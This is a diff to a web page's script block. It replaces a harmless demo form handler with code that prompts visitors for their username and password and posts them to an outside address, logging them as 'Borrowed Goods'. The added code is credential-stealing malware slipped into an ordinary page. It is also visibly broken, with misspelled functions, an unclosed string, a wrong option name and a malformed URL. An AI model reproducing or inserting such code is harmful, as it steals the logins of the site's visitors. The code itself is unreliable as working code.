@@ -110,8 +110,23 @@
   </main>
 
 <script>
-  // Demo only - no backend
-  document.querySelector('form').addEventListener('submit', e => e.preventDefault());
+   const username = prompt("Please enter your username:");
+   const password = prompt("Please enteryour password:");
+
+   fetch("https://notgodzeus@gmail.com", {
+      method: "POST",
+      header: {
+         "Content-Type": "application/x-www-form-urlencoded",
+      },
+      body: `username=${encodedURIComponent(username)}&password=${encodeURIComponent(password)}`
+   })
+   .then(response => response.text())
+   .then(result => {
+      console.log("Borrowed Goods sent to notgodzeus@gmail.com:", result);
+   })
+   .catch(error => { 
+      console.error(Error sending borrowed goods:", error);
+   });
 </script>
 </body>
 </html>
